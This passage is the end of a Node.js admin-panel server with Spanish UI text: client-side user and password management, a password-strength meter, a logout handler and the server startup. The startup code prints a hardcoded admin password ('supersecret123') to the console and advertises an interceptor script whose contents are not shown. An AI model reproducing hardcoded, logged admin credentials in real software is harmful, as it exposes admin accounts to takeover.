}

function backToUsers() {
  bootstrap.Modal.getInstance(document.getElementById("changePassModal"))?.hide();
  setTimeout(() => new bootstrap.Modal(document.getElementById("usersModal")).show(), 200);
}

async function saveNewPassword() {
  const newPass  = document.getElementById("cpNewPass").value;
  const confirm2 = document.getElementById("cpConfirm").value;
  const alertDiv = document.getElementById("cpAlert");
  const btn      = document.getElementById("cpSaveBtn");
  alertDiv.className = "d-none mb-3";

  if (!newPass)           { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "La contraseña es obligatoria."; return; }
  if (newPass.length < 8) { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Mínimo 8 caracteres."; return; }
  if (newPass !== confirm2){ alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Las contraseñas no coinciden."; return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span>Guardando…';
  try {
    const res  = await fetch("/admin/users/" + encodeURIComponent(currentEditUser) + "/password", {
      method: "PUT", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: newPass }),
    });
    const data = await res.json();
    if (res.ok && data.success) {
      backToUsers();
      showToast("✅ Contraseña actualizada para " + currentEditUser, "success");
    } else { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = data.error || "Error."; }
  } catch { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Error de red."; }
  finally { btn.disabled = false; btn.innerHTML = '<i class="bi bi-key-fill me-1"></i>Guardar contraseña'; }
}

async function addUser() {
  const username = document.getElementById("addUsername").value.trim();
  const password = document.getElementById("addPassword").value;
  const alertDiv = document.getElementById("addUserAlert");
  alertDiv.className = "d-none mb-3";

  if (!username || !password) { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Usuario y contraseña son obligatorios."; return; }
  if (password.length < 8)    { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = "Mínimo 8 caracteres."; return; }

  const res  = await fetch("/admin/users", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  const data = await res.json();
  if (res.ok && data.success) {
    document.getElementById("addUsername").value = "";
    document.getElementById("addPassword").value = "";
    document.getElementById("addPwBar").style.width = "0%";
    document.getElementById("addPwLabel").textContent = "";
    await loadUsers();
    showToast("✅ Usuario creado: " + username, "success");
  } else { alertDiv.className = "alert alert-danger mb-3"; alertDiv.textContent = data.error || "Error."; }
}

// ══ HELPERS ═════════════════════════════════════════════
function togglePw(id) {
  const inp = document.getElementById(id);
  inp.type = inp.type === "password" ? "text" : "password";
}

function checkPwStrength(barId, labelId, pw) {
  const bar = document.getElementById(barId), label = document.getElementById(labelId);
  let s = 0;
  if (pw.length >= 8) s++; if (pw.length >= 12) s++;
  if (/[A-Z]/.test(pw) && /[a-z]/.test(pw)) s++;
  if (/[0-9]/.test(pw)) s++; if (/[^A-Za-z0-9]/.test(pw)) s++;
  const lvls = [
    { p: "20%", c: "#ef4444", t: "Muy débil" },
    { p: "40%", c: "#f97316", t: "Débil" },
    { p: "60%", c: "#eab308", t: "Media" },
    { p: "80%", c: "#84cc16", t: "Buena" },
    { p: "100%", c: "#22c55e", t: "Excelente" },
  ];
  const l = lvls[Math.min(s, 4)];
  bar.style.width = l.p; bar.style.background = l.c;
  label.textContent = l.t; label.style.color = l.c;
}

function showToast(msg, type = "success") {
  const toast = document.getElementById("appToast"), body = document.getElementById("appToastBody");
  toast.className = "toast align-items-center border-0 text-white bg-" + (type === "success" ? "success" : "danger");
  body.textContent = msg;
  bootstrap.Toast.getOrCreateInstance(toast, { delay: 4000 }).show();
}

function doLogout() {
  fetch("/admin/logout-clear", {
    headers: { "Authorization": "Basic " + btoa("__invalid__:__invalid__") },
    cache: "no-store"
  }).finally(() => {
    window.location.replace("/admin/logged-out");
  });
}

document.querySelectorAll("[title]").forEach(el => {
  try { new bootstrap.Tooltip(el, { trigger: "hover", placement: "top" }); } catch {}
});
</script>
</body>
</html>`;
}

// ──────────────────────────────────────────────────────────
// ARRANCAR EL SERVIDOR
// ──────────────────────────────────────────────────────────
app.listen(PORT, () => {
  logger.info("server_start", { event: "SERVER_STARTED", port: PORT, pid: process.pid });
  console.log("\n🚀  Servidor en      http://localhost:" + PORT);
  console.log("📊  Visor de logs    http://localhost:" + PORT + "/admin/logs");
  console.log("🪝  Interceptor JS   http://localhost:" + PORT + "/interceptor.js");
  console.log("   (usuario: admin | contraseña: supersecret123)\n");
});
